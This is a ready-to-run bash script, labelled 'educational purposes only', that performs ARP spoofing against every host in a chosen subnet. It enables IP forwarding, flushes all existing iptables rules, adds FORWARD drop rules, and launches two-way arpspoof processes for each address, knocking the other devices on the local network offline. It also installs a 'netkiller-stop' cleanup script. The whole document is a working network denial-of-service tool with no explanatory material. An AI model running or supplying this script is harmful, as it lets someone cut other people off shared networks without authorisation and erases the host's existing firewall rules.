#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Targets all possible IPs in subnet (without scanning)
# Requires: arpspoof, iptables, ipcalc

set -e

# Check for required programs
for cmd in arpspoof iptables ipcalc; do
    command -v $cmd >/dev/null 2>&1 || { echo "$cmd not found. Install it."; exit 1; }
done

echo "Enter the Network Interface (e.g., wlan0):"
read -rp "> " INTERFACE

echo "Enter the Router Gateway IP:"
read -rp "> " GATEWAY

# Detect Device IP
DEFAULT_IP=$(ip addr show "$INTERFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -n1)
echo "Enter Device IP (Press Enter to use $DEFAULT_IP):"
read -rp "> " DEVIP
MYIP="${DEVIP:-$DEFAULT_IP}"

echo "Enter the target subnet (e.g., 192.168.1.1/24):"
read -rp "> " TARGET_SUBNET

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward >/dev/null

# Flush existing rules
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -F FORWARD || true

# Create stop script
cat << 'EOF' | sudo tee /usr/local/bin/netkiller-stop >/dev/null
#!/bin/sh
iptables -F
iptables -X
iptables -t nat -F
iptables -F FORWARD || true
pkill arpspoof
echo "Restoring the connection..."
EOF
sudo chmod 755 /usr/local/bin/netkiller-stop

# Function to expand a subnet to individual IPs (using ipcalc)
expand_subnet() {
    SUBNET=$1
    IFS='/' read -r IP MASK <<< "$SUBNET"
    ipcalc -n -b "$SUBNET" | awk '/HostMin/ {start=$2} /HostMax/ {end=$2} END {if(start && end) print start, end}'
}

# Expand subnet for ARP spoofing
read -r HOSTMIN HOSTMAX < <(expand_subnet "$TARGET_SUBNET")
if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
    # Convert IPs to integers
    ip2int() {
        local a b c d
        IFS=. read -r a b c d <<< "$1"
        echo "$((a*256**3 + b*256**2 + c*256 + d))"
    }
    int2ip() {
        local ip=$1
        echo "$((ip>>24&255)).$((ip>>16&255)).$((ip>>8&255)).$((ip&255))"
    }
    START=$(ip2int "$HOSTMIN")
    END=$(ip2int "$HOSTMAX")

    # Insert iptables rules ONCE
    sudo iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
    sudo iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP

    for ((i=START; i<=END; i++)); do
        TARGET_IP=$(int2ip $i)
        if [[ "$TARGET_IP" == "$MYIP" ]] || [[ "$TARGET_IP" == "$GATEWAY" ]]; then
            continue
        fi
        # Bidirectional ARPspoofing policy
        sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
    done
fi

echo "Attack is running against all possible hosts in $TARGET_SUBNET"
echo "To stop, type: sudo netkiller-stop"
